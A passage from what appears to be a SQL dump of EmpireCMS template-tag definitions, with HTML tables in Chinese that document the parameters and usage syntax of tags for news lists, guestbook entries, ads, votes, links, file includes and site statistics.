align=\\\"center\\\">操作类型</div>\r\n            </td>\r\n            <td height=\\\"25\\\">具体看操作类型说明</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">是否显示栏目名</div>\r\n            </td>\r\n            <td height=\\\"25\\\">0为不显示，1为显示</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">时间格式化</div>\r\n            </td>\r\n            <td height=\\\"25\\\">形式：Y-m-d H:i:s．默认为：\\\'(m-d)\\\'</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">附加SQL条件</div>\r\n            </td>\r\n            <td height=\\\"25\\\">附加调用条件，如：&quot;title=\\\'帝国\\\'&quot;</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">显示排序</div>\r\n            </td>\r\n            <td height=\\\"25\\\">可指定按相应的字段排序，如：&quot;id desc&quot;</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td colspan=\\\"2\\\">\r\n            <div align=\\\"center\\\">（注：在栏目ID中写大栏目，系统会自己搜索子栏目的信息）</div>\r\n            </td>\r\n        </tr>\r\n    </tbody>\r\n</table>','sys_GetClassNews','phomenews',1,'[phomenews]栏目ID,显示条数,标题截取数,是否显示时间,操作类型,是否显示栏目名,\\\'时间格式化\\\',附加SQL条件,显示排序[/phomenews]',0,1,9),(22,'留言板调用','<table border=\\\"0\\\" cellspacing=\\\"1\\\" cellpadding=\\\"3\\\" width=\\\"100%\\\" bgcolor=\\\"#dbeaf5\\\">\r\n    <tbody>\r\n        <tr>\r\n            <td width=\\\"40%\\\">\r\n            <div align=\\\"center\\\">参数</div>\r\n            </td>\r\n            <td width=\\\"60%\\\">参数说明</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">显示信息数</div>\r\n            </td>\r\n            <td height=\\\"25\\\">显示记录数</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">标签模板ID</div>\r\n            </td>\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"left\\\">查看标签模板ID点<a onclick=\\\"window.open(\\\'ListBqtemp.php?[!--ehash--]\\\');\\\"><strong><u>这里</u></strong></a></div>\r\n            </td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">&nbsp;</div>\r\n            </td>\r\n            <td height=\\\"25\\\">模板标签变量说明：<br />\r\n            留言ID：[!--lyid--]，留言内容：[!--lytext--]<br />\r\n            回复内容：[!--retext--]，留言时间：[!--lytime--]<br />\r\n            留言者：[!--name--]，留言者邮箱：[!--email--]<br />\r\n            序号：[!--no--]</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">留言分类ID</div>\r\n            </td>\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"left\\\">点击<strong><a onclick=\\\"window.open(\\\'../tool/GbookClass.php?[!--ehash--]\\\');\\\">这里</a></strong>查看分类ID，0为不限制</div>\r\n            </td>\r\n        </tr>\r\n    </tbody>\r\n</table>','sys_ShowLyInfo','gbookinfo',1,'[gbookinfo]显示信息数,标签模板ID,留言分类ID[/gbookinfo]',0,3,5),(23,'专题调用标签','<table border=\\\"0\\\" cellspacing=\\\"1\\\" cellpadding=\\\"3\\\" width=\\\"100%\\\" bgcolor=\\\"#dbeaf5\\\">\r\n    <tbody>\r\n        <tr>\r\n            <td>\r\n            <div align=\\\"center\\\">参数</div>\r\n            </td>\r\n            <td>参数说明</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">\r\n            <div align=\\\"center\\\">标签模板ID</div>\r\n            </div>\r\n            </td>\r\n            <td height=\\\"25\\\">查看标签模板ID点<a onclick=\\\"window.open(\\\'ListBqtemp.php?[!--ehash--]\\\');\\\"><strong><u>这里</u></strong></a></td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">&nbsp;</div>\r\n            </td>\r\n            <td height=\\\"25\\\">\r\n            <p>模板标签变量说明：(list.var)<br />\r\n            [!--classurl--]：专题链接，[!--classname--]：专题名称<br />\r\n            [!--classid--]：专题id，[!--classimg--]：专题图片<br />\r\n            [!--intro--]：专题简介,[!--no--]：序号</p>\r\n            </td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">专题类别ID</div>\r\n            </td>\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"left\\\">点击<strong><a onclick=\\\"window.open(\\\'../special/ListZtClass.php?[!--ehash--]\\\');\\\">这里</a></strong>查看分类ID，0为不限制，多个分类ID用逗号隔开，如\\\'1,2\\\'</div>\r\n            </td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">显示专题数</div>\r\n            </td>\r\n            <td height=\\\"25\\\">0为不限制</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">所属栏目ID</div>\r\n            </td>\r\n            <td height=\\\"25\\\">点击<strong><a onclick=\\\"window.open(\\\'../ListClass.php?[!--ehash--]\\\');\\\">这里</a></strong>查看栏目ID，0为不限制，多个栏目ID用逗号隔开，如\\\'1,2\\\'</td>\r\n        </tr>\r\n    </tbody>\r\n</table>','sys_ShowZtData','eshowzt',1,'[eshowzt]标签模板ID,专题类别ID,显示专题数,所属栏目ID[/eshowzt]',0,2,6),(2,'图文信息调用(标题图片的信息)','<table border=\\\"0\\\" cellspacing=\\\"1\\\" cellpadding=\\\"3\\\" width=\\\"100%\\\" bgcolor=\\\"#dbeaf5\\\">\r\n    <tbody>\r\n        <tr>\r\n            <td>\r\n            <div align=\\\"center\\\">参数</div>\r\n            </td>\r\n            <td>参数说明</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">栏目ID</div>\r\n            </td>\r\n            <td height=\\\"25\\\">查看栏目ID点<a onclick=\\\"window.open(\\\'../ListClass.php?[!--ehash--]\\\');\\\"><strong><u>这里</u></strong></a>，查看标题分类ID点<a onclick=\\\"window.open(\\\'../info/InfoType.php?[!--ehash--]\\\');\\\"><strong><u>这里</u></strong></a>,当前ID=\\\'selfinfo\\\'<br />\r\n            多个栏目ID与标题分类ID可用,号格开，如\\\'1,2\\\'</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">每行显示条数</div>\r\n            </td>\r\n            <td height=\\\"25\\\">每行显示几个图片</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">显示总信息数</div>\r\n            </td>\r\n            <td height=\\\"25\\\">显示信息总数</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">图片宽度，图片高度</div>\r\n            </td>\r\n            <td height=\\\"25\\\">图文信息图片大小</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">是否显示标题</div>\r\n            </td>\r\n            <td height=\\\"25\\\">是否在图片下显示标题，0为不显示，1为显示</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td bgcolor=\\\"#ffffff\\\" height=\\\"25\\\">\r\n            <div align=\\\"center\\\">标题截取数</div>\r\n            </td>\r\n            <td height=\\\"25\\\">截取几个字符</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td bgcolor=\\\"#ffffff\\\" height=\\\"25\\\">\r\n            <div align=\\\"center\\\">操作类型说明</div>\r\n            </td>\r\n            <td height=\\\"25\\\">具体看操作类型说明</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">附加SQL条件</div>\r\n            </td>\r\n            <td height=\\\"25\\\">附加调用条件，如：&quot;title=\\\'帝国\\\'&quot;</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">显示排序</div>\r\n            </td>\r\n            <td height=\\\"25\\\">可指定按相应的字段排序，如：&quot;id desc&quot;</td>\r\n        </tr>\r\n    </tbody>\r\n</table>','sys_GetClassNewsPic','phomenewspic',1,'[phomenewspic]栏目ID,每行显示条数,显示总信息数,图片宽度,图片高度,是否显示标题,标题截取数,操作类型,附加SQL条件,显示排序[/phomenewspic]',0,1,9),(5,'广告标签','<table border=\\\"0\\\" cellspacing=\\\"1\\\" cellpadding=\\\"3\\\" width=\\\"100%\\\" bgcolor=\\\"#dbeaf5\\\">\r\n    <tbody>\r\n        <tr>\r\n            <td>\r\n            <div align=\\\"center\\\">参数</div>\r\n            </td>\r\n            <td>参数说明</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">广告ID</div>\r\n            </td>\r\n            <td height=\\\"25\\\">查看广告ID点<a onclick=\\\"window.open(\\\'../tool/ListAd.php?[!--ehash--]\\\');\\\"><strong><u>这里</u></strong></a></td>\r\n        </tr>\r\n    </tbody>\r\n</table>','sys_GetAd','phomead',1,'[phomead]广告ID[/phomead]',0,3,5),(6,'投票标签','<table border=\\\"0\\\" cellspacing=\\\"1\\\" cellpadding=\\\"3\\\" width=\\\"100%\\\" bgcolor=\\\"#dbeaf5\\\">\r\n    <tbody>\r\n        <tr>\r\n            <td>\r\n            <div align=\\\"center\\\">参数</div>\r\n            </td>\r\n            <td>参数说明</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">投票ID</div>\r\n            </td>\r\n            <td height=\\\"25\\\">查看投票ID点<a onclick=\\\"window.open(\\\'../tool/ListVote.php?[!--ehash--]\\\');\\\"><strong><u>这里</u></strong></a></td>\r\n        </tr>\r\n    </tbody>\r\n</table>','sys_GetVote','phomevote',1,'[phomevote]投票ID[/phomevote]',0,3,5),(11,'带模板的信息调用标签[万能标签]','<table border=\\\"0\\\" cellspacing=\\\"1\\\" cellpadding=\\\"3\\\" width=\\\"100%\\\" bgcolor=\\\"#dbeaf5\\\">\r\n    <tbody>\r\n        <tr>\r\n            <td>\r\n            <div align=\\\"center\\\">参数</div>\r\n            </td>\r\n            <td>参数说明</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">栏目ID</div>\r\n            </td>\r\n            <td height=\\\"25\\\">查看栏目ID点<a onclick=\\\"window.open(\\\'../ListClass.php?[!--ehash--]\\\');\\\"><strong><u>这里</u></strong></a>，查看标题分类ID点<a onclick=\\\"window.open(\\\'../info/InfoType.php?[!--ehash--]\\\');\\\"><strong><u>这里</u></strong></a>,当前ID=\\\'selfinfo\\\'<br />\r\n            多个栏目ID与标题分类ID可用,号格开，如\\\'1,2\\\'</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">显示条数</div>\r\n            </td>\r\n            <td height=\\\"25\\\">显示前几条记录</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">标题截取数</div>\r\n            </td>\r\n            <td height=\\\"25\\\">截取几个字符</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">是否显示栏目名</div>\r\n            </td>\r\n            <td height=\\\"25\\\">0为不显示，1为显示</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">操作类型</div>\r\n            </td>\r\n            <td height=\\\"25\\\">具体看操作类型说明</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">标签模板ID</div>\r\n            </td>\r\n            <td height=\\\"25\\\">查看标签模板ID点<a onclick=\\\"window.open(\\\'ListBqtemp.php?[!--ehash--]\\\');\\\"><strong><u>这里</u></strong></a></td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">只显示有标题图片</div>\r\n            </td>\r\n            <td height=\\\"25\\\">0为不限制，1为只显示有标题图片的信息</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">附加SQL条件</div>\r\n            </td>\r\n            <td height=\\\"25\\\">附加调用条件，如：&quot;title=\\\'帝国\\\'&quot;</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">显示排序</div>\r\n            </td>\r\n            <td height=\\\"25\\\">可指定按相应的字段排序，如：&quot;id desc&quot;</td>\r\n        </tr>\r\n    </tbody>\r\n</table>','sys_GetEcmsInfo','ecmsinfo',1,'[ecmsinfo]栏目ID,显示条数,标题截取数,是否显示栏目名,操作类型,模板ID,只显示有标题图片,附加SQL条件,显示排序[/ecmsinfo]',0,1,10),(12,'友情链接标签','<table border=\\\"0\\\" cellspacing=\\\"1\\\" cellpadding=\\\"3\\\" width=\\\"100%\\\" bgcolor=\\\"#dbeaf5\\\">\r\n    <tbody>\r\n        <tr>\r\n            <td width=\\\"40%\\\">\r\n            <div align=\\\"center\\\">参数</div>\r\n            </td>\r\n            <td width=\\\"60%\\\">参数说明</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">每行显示记录数</div>\r\n            </td>\r\n            <td height=\\\"25\\\">每行显示记录数</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">显示总记录数</div>\r\n            </td>\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"left\\\">总记录数</div>\r\n            </td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">操作类型</div>\r\n            </td>\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"left\\\">0为所有记录，1为图片链接，2为文字链接</div>\r\n            </td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">分类ID</div>\r\n            </td>\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"left\\\">点击<strong><a onclick=\\\"window.open(\\\'../tool/LinkClass.php?[!--ehash--]\\\');\\\">这里</a></strong>查看分类ID，0为不限制</div>\r\n            </td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">是否显示原链接</div>\r\n            </td>\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"left\\\">0为统计点击链接，1为显示原链接</div>\r\n            </td>\r\n        </tr>\r\n    </tbody>\r\n</table>','sys_GetSitelink','phomelink',1,'[phomelink]每行显示数,显示总数,操作类型,分类id,是否显示原链接[/phomelink]',0,3,5),(15,'引用文件标签','<p>[includefile]\\\'文件地址\\\'[/includefile]<br />\r\n文件地址需要为相对地址,并且从后台目录算起：&quot;../../header.html&quot;（这个地址的header.html是放在ecms根目录）</p>','sys_IncludeFile','includefile',1,'[includefile]\\\'文件地址\\\'[/includefile]',1,4,4),(16,'读取远程页面','<p>[readhttp]\\\'页面地址\\\'[/readhttp]</p>','sys_ReadFile','readhttp',1,'[readhttp]\\\'页面地址\\\'[/readhttp]',1,4,4),(17,'网站信息统计','<p>操作类型说明：\r\n<table border=\\\"0\\\" cellspacing=\\\"1\\\" cellpadding=\\\"3\\\" width=\\\"100%\\\">\r\n    <tbody>\r\n        <tr bgcolor=\\\"#dbeaf5\\\">\r\n            <td width=\\\"25%\\\">\r\n            <div align=\\\"center\\\">操作类型</div>\r\n            </td>\r\n            <td width=\\\"75%\\\">内容</td>\r\n        </tr>\r\n        <tr>\r\n            <td>\r\n            <div align=\\\"center\\\">0</div>\r\n            </td>\r\n            <td>统计栏目数据</td>\r\n        </tr>\r\n        <tr>\r\n            <td>\r\n            <div align=\\\"center\\\">1</div>\r\n            </td>\r\n            <td>统计标题分类</td>\r\n        </tr>\r\n        <tr>\r\n            <td>\r\n            <div align=\\\"center\\\">2</div>\r\n            </td>\r\n            <td>统计数据表</td>\r\n        </tr>\r\n    </tbody>\r\n</table>\r\n<br />\r\n时间范围：0为不限；1为今日；2为本月；3为本年。<br />\r\n统计类型：0为统计信息数；1为统计评论数；2为统计点击数；3为统计下载数。<br />\r\n如果操作类型是&ldquo;统计数据表&rdquo;，栏目ID=\\\'数据表名\\\'</p>','sys_TotalData','totaldata',1,'[totaldata]栏目ID,操作类型,时间范围,统计类型[/totaldata]',0,1,7),(18,'FLASH幻灯信息调用','<table border=\\\"0\\\" cellspacing=\\\"1\\\" cellpadding=\\\"3\\\" width=\\\"100%\\\" bgcolor=\\\"#dbeaf5\\\">\r\n    <tbody>\r\n        <tr>\r\n            <td>\r\n            <div align=\\\"center\\\">参数</div>\r\n            </td>\r\n            <td>参数说明</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">\r\n            <div align=\\\"center\\\">栏目ID</div>\r\n            </div>\r\n            </td>\r\n            <td height=\\\"25\\\">查看栏目ID点<a onclick=\\\"window.open(\\\'../ListClass.php?[!--ehash--]\\\');\\\"><strong><u>这里</u></strong></a>，查看标题分类ID点<a onclick=\\\"window.open(\\\'../info/InfoType.php?[!--ehash--]\\\');\\\"><strong><u>这里</u></strong></a>,当前ID=\\\'selfinfo\\\'<br />\r\n            多个栏目ID与标题分类ID可用,号格开，如\\\'1,2\\\'</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">显示总数</div>\r\n            </td>\r\n            <td height=\\\"25\\\">显示信息总数</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">图片宽度，图片高度</div>\r\n            </td>\r\n            <td height=\\\"25\\\">图文信息图片大小</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">是否显示标题</div>\r\n            </td>\r\n            <td height=\\\"25\\\">是否在图片下显示标题，0为不显示，1为显示</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td bgcolor=\\\"#ffffff\\\" height=\\\"25\\\">\r\n            <div align=\\\"center\\\">标题截取数</div>\r\n            </td>\r\n            <td height=\\\"25\\\">截取几个字符</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td bgcolor=\\\"#ffffff\\\" height=\\\"25\\\">\r\n            <div align=\\\"center\\\">操作类型说明</div>\r\n            </td>\r\n            <td height=\\\"25\\\">具体看操作类型说明</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">附加SQL条件</div>\r\n            </td>\r\n            <td height=\\\"25\\\">附加调用条件，如：&quot;title=\\\'帝国\\\'&quot;</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">显示排序</div>\r\n            </td>\r\n            <td height=\\\"25\\\">可指定按相应的字段排序，如：&quot;id desc&quot;</td>\r\n        </tr>\r\n    </tbody>\r\n</table>','sys_FlashPixpic','phomeflashpic',1,'[phomeflashpic]栏目ID,显示总数,图片宽度,图片高度,是否显示标题,标题截取数,操作类型,停顿秒数,附加SQL条件,显示排序[/phomeflashpic]',0,1,9),(19,'搜索关键字调用标签','<p>栏目id为0，则显示所有栏目的关键字</p>\r\n<p>操作类型：0为搜索热门排行，1为最新搜索排行</p>','sys_ShowSearchKey','showsearch',1,'[showsearch]每行显示条数,总条数,栏目id,操作类型[/showsearch]',0,1,7),(20,'循环子栏目数据标签','<table border=\\\"0\\\" cellspacing=\\\"1\\\" cellpadding=\\\"3\\\" width=\\\"100%\\\" bgcolor=\\\"#dbeaf5\\\">\r\n    <tbody>\r\n        <tr>\r\n            <td>\r\n            <div align=\\\"center\\\">参数</div>\r\n            </td>\r\n            <td>参数说明</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">栏目ID</div>\r\n            </td>\r\n            <td height=\\\"25\\\">查看栏目ID点<a onclick=\\\"window.open(\\\'../ListClass.php?[!--ehash--]\\\');\\\"><strong><u>这里</u></strong></a>，单个为父栏目ID，多栏目可用&quot;,&quot;格开<br />\r\n            当前栏目ID用：\\\'selfinfo\\\'</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">显示条数</div>\r\n            </td>\r\n            <td height=\\\"25\\\">显示前几条记录</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">标题截取数</div>\r\n            </td>\r\n            <td height=\\\"25\\\">截取几个字符</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">是否显示栏目名</div>\r\n            </td>\r\n            <td height=\\\"25\\\">0为不显示，1为显示</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">操作类型</div>\r\n            </td>\r\n            <td height=\\\"25\\\">0：栏目最新<br />\r\n            1：栏目热门<br />\r\n            2：栏目推荐<br />\r\n            3：栏目评论排行<br />\r\n            4：栏目头条<br />\r\n            5：栏目下载排行</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">标签模板ID</div>\r\n            </td>\r\n            <td height=\\\"25\\\">查看标签模板ID点<a onclick=\\\"window.open(\\\'ListBqtemp.php?[!--ehash--]\\\');\\\"><strong><u>这里</u></strong></a></td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">只显示有标题图片</div>\r\n            </td>\r\n            <td height=\\\"25\\\">0为不限制，1为只显示有标题图片的信息</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">显示栏目数</div>\r\n            </td>\r\n            <td height=\\\"25\\\">0为不限制</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">显示头条操作类型</div>\r\n            </td>\r\n            <td height=\\\"25\\\">0：不显示栏目头条<br />\r\n            1：栏目内容简介<br />\r\n            2：栏目推荐信息<br />\r\n            3：栏目头条信息<br />\r\n            4：栏目最新信息</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">头条标题截取数</div>\r\n            </td>\r\n            <td height=\\\"25\\\">截取几个字符</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">头条简介截取数</div>\r\n            </td>\r\n            <td height=\\\"25\\\">截取几个字符</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">头条只显示有标题图片</div>\r\n            </td>\r\n            <td height=\\\"25\\\">0为不限制，1为只显示有标题图片的信息</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">附加SQL条件</div>\r\n            </td>\r\n            <td height=\\\"25\\\">附加调用条件，如：&quot;title=\\\'帝国\\\'&quot;</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">显示排序</div>\r\n            </td>\r\n            <td height=\\\"25\\\">可指定按相应的字段排序，如：&quot;id desc&quot;</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">头条的模板变量<br />\r\n            (标签模板的页面模板内容中使用)</div>\r\n            </td>\r\n            <td height=\\\"25\\\">[!--sonclass.id--]：信息ID<br />\r\n            [!--sonclass.title--]：信息标题<br />\r\n            [!--sonclass.oldtitle--]：信息标题(不截取字数)<br />\r\n            [!--sonclass.titlepic--]：标题图片<br />\r\n            [!--sonclass.titleurl--]：信息链接<br />\r\n            [!--sonclass.text--]：信息简介</td>\r\n        </tr>\r\n    </tbody>\r\n</table>','sys_ForSonclassData','listsonclass',1,'[listsonclass]栏目ID,显示条数,标题截取数,是否显示栏目名,操作类型,模板ID,只显示有标题图片,显示栏目数,显示头条操作类型,头条标题截取数,头条简介截取数,头条只显示有标题图片,附加SQL条件,显示排序[/listsonclass]',0,1,9),(21,'带模板的栏目导航标签','<table border=\\\"0\\\" cellspacing=\\\"1\\\" cellpadding=\\\"3\\\" width=\\\"100%\\\" bgcolor=\\\"#dbeaf5\\\">\r\n    <tbody>\r\n        <tr>\r\n            <td>\r\n            <div align=\\\"center\\\">参数</div>\r\n            </td>\r\n            <td>参数说明</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">父栏目ID</div>\r\n            </td>\r\n            <td height=\\\"25\\\">查看栏目ID点<a onclick=\\\"window.open(\\\'../ListClass.php?[!--ehash--]\\\');\\\"><strong><u>这里</u></strong></a><br />\r\n            \\\'0\\\'为显示所有一级栏目<br />\r\n            \\\'selfinfo\\\'显示本栏目下级栏目</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">\r\n            <div align=\\\"center\\\">标签模板ID</div>\r\n            </div>\r\n            </td>\r\n            <td height=\\\"25\\\">查看标签模板ID点<a onclick=\\\"window.open(\\\'ListBqtemp.php?[!--ehash--]\\\');\\\"><strong><u>这里</u></strong></a></td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">&nbsp;</div>\r\n            </td>\r\n            <td height=\\\"25\\\">\r\n            <p>模板标签变量说明：[!--bclassname--]：父栏目名,[!--bclassurl--]：父栏目链接,[!--bclassid--]：父栏目id</p>\r\n            <p>list.var模板标签：<br />\r\n            [!--classurl--]：栏目链接,[!--classname--]：栏目名称,[!--classid--]：栏目id,[!--classimg--]：栏目图片,[!--intro--]：栏目简介,[!--num--]：信息数,[!--no--]：序号</p>\r\n            </td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">是否显示栏目信息数</div>\r\n            </td>\r\n            <td height=\\\"25\\\">0为不显示，1为显示</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">显示栏目数</div>\r\n            </td>\r\n            <td height=\\\"25\\\">0为不限制</td>\r\n        </tr>\r\n    </tbody>\r\n</table>','sys_ShowClassByTemp','showclasstemp',1,'[showclasstemp]父栏目ID,标签模板ID,是否显示栏目信息数,显示栏目数[/showclasstemp]',0,2,6),(24,'图库模型分页标签','<p>\r\n<table border=\\\"0\\\" cellspacing=\\\"1\\\" cellpadding=\\\"3\\\" width=\\\"100%\\\" bgcolor=\\\"#dbeaf5\\\">\r\n    <tbody>\r\n        <tr>\r\n            <td>\r\n            <div align=\\\"center\\\">参数</div>\r\n            </td>\r\n            <td>参数说明</td>\r\n        </tr>\r\n        <tr bgcolor=\\\"#ffffff\\\">\r\n            <td height=\\\"25\\\">\r\n            <div align=\\\"center\\\">\r\n            <div align=\\\"center\\\">标签模板ID</div>\r\n            